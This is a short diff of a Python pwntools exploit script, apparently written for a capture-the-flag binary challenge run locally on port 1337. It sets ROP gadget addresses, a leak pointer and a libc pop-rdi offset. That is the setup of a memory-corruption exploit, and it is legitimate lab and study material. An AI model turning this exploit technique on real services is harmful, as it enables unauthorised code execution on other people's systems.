@@ -1,10 +1,10 @@
 from pwn import *
 context.arch = "amd64"
-#p = process("main_patched")
-p = remote("0.0.0.0", 1337)
+p = process("./main_patched")
+p = remote("localhost", 1337)
 elf = ELF("main_patched", checksec = False)
-libc = elf.libc
-#libc = ELF("./libc.so.6", checksec = False)
+#libc = elf.libc
+libc = ELF("./libc.so.6", checksec = False)
 gift = p64(0x00000000004011f6) # mov rdi, QWORD PTR [rbp - 0x10]
 leak = p64(0x400600 + 0x10) # pwndbg> search --pointer 0x404010
 rdi = 0x00000000000240e5 # from libc
